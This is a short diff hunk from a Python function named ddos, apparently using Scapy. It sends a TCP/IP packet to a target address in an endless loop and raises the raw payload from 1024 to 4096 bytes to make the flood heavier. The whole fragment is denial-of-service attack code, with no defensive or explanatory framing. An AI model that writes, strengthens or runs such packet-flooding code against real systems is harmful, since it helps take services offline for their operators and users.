@@ -18,7 +18,7 @@ def ddos(target_IP):
     ip = IP(dst=target_IP)
 
 
-    raw = Raw(b"X"*1024)
+    raw = Raw(b"X"*4096)
     p = ip / tcp / raw
     send(p, loop=1, verbose = 0)
 
